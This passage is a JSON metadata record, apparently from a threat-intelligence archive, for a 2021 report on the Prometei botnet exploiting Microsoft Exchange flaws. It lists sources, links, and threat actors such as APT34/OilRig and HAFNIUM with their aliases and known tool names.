threat researcher at Cybereason, focusing on threat hunting and malware research. Lior began her career as a team leader in\nthe security operations center in the Israeli Air Force where she mostly focused on incident response and malware analysis.\n\n[All Posts by Lior Rochberger](https://www.cybereason.com/blog/authors/lior-rochberger)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-22 - Prometei Botnet Exploiting Microsoft Exchange Vulnerabilities.pdf"
    ],
    "report_names": [
        "2021-04-22 - Prometei Botnet Exploiting Microsoft Exchange Vulnerabilities.pdf"
    ],
    "threat_actors": [
        {
            "id": "ce10c1bd-4467-45f9-af83-28fc88e35ca4",
            "created_at": "2022-10-25T15:50:23.458833Z",
            "updated_at": "2025-03-27T02:00:55.475188Z",
            "deleted_at": null,
            "main_name": "APT34",
            "aliases": null,
            "source_name": "MITRE:APT34",
            "tools": [
                "netstat",
                "Systeminfo",
                "PsExec",
                "SEASHARPEE",
                "Tasklist",
                "Mimikatz",
                "POWRUNER",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "529c1ae9-4579-4245-86a6-20f4563a695d",
            "created_at": "2022-10-25T16:07:23.702006Z",
            "updated_at": "2025-03-27T02:02:09.93109Z",
            "deleted_at": null,
            "main_name": "Hafnium",
            "aliases": [
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "ETDA:Hafnium",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7c969685-459b-4c93-a788-74108eab6f47",
            "created_at": "2023-01-06T13:46:39.189751Z",
            "updated_at": "2025-03-27T02:00:03.017103Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "ATK233",
                "G0125",
                "Operation Exchange Marauder",
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "MISPGALAXY:HAFNIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2704d770-43b4-4bc4-8a5a-05df87416848",
            "created_at": "2022-10-25T15:50:23.306305Z",
            "updated_at": "2025-03-27T02:00:55.43633Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "HAFNIUM",
                "Operation Exchange Marauder",
                "Silk Typhoon"
            ],
            "source_name": "MITRE:HAFNIUM",
            "tools": [
                "Tarrask",
                "ASPXSpy",
                "Impacket",
                "PsExec",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3eebdb3f-f4e3-42e5-bb4d-f02a13328316",
            "created_at": "2024-05-01T02:03:08.014303Z",
            "updated_at": "2025-03-27T02:05:17.306592Z",
            "deleted_at": null,
            "main_name": "COBALT EDGEWATER",
            "aliases": [
                "Cold River ",
                "DNSpionage ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT EDGEWATER",
            "tools": [
                " DNSpionage",
                " Karkoff",
                " MailDropper",
                " SideTwist",
                " TWOTONE",
                "AgentDrable"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535892,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1653762347,
    "ts_modification_date": 1653762347,
    "files": {
        "pdf": "https://archive.orkl.eu/0559e695b2a2d674219e2c2bf176a44fe88a72db.pdf",
        "text": "https://archive.orkl.eu/0559e695b2a2d674219e2c2bf176a44fe88a72db.txt",
        "img": "https://archive.orkl.eu/0559e695b2a2d674219e2c2bf176a44fe88a72db.jpg"
    }
}